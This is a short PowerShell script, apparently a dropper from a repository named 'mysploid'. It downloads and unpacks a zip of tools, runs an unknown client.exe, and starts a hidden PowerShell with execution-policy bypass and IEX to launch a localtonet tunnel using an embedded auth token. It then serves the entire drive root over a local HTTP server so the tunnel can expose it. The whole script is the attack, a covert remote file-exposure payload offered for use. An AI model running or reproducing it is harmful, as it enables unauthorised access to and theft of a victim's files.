cd ..
set-clipboard (get-location)
$plocation = (get-clipboard)
cd \
set-clipboard (get-location)
$dlocation = (get-clipboard)
Invoke-WebRequest -Uri https://github.com/mehmetdere/mysploid/raw/main2/toolsv2.zip -OutFile (Join-Path $plocation toolsv2.zip)
Add-Type -AssemblyName System.IO.Compression.FileSystem
 function Unzip
 {
     param([string]$zipfile, [string]$outpath)

     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

Unzip "$plocation\toolsv2.zip" "$dlocation"
add-appxpackage -path "$dlocation\toolsv2\python310.appx"
cd $dlocation\toolsv2
./client.exe
robocopy 'results' "$dlocation\"
start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
cd "$dlocation\"
mkdir PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0
robocopy "$dlocation\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0" "$dlocation\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0" /E
cd "$dlocation\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0"
./python.exe -m http.server 4040 --bind 127.0.0.1 --directory "$dlocation\"

